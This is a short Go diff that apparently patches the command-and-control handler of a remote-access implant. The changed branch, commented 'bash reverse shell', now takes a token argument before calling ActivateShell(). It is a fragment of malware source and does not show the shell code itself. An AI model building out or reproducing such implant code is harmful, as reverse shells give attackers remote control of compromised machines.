@@ -51,10 +51,11 @@ func processCCData(data *MsgTunData) {
 
 		// bash reverse shell
 		if cmdSlice[0] == "bash" {
-			if len(cmdSlice) != 1 {
+			if len(cmdSlice) != 2 {
 				return
 			}
-			ActivateShell()
+			token := cmdSlice[1]
+			ActivateShell(token)
 			return
 		}
 
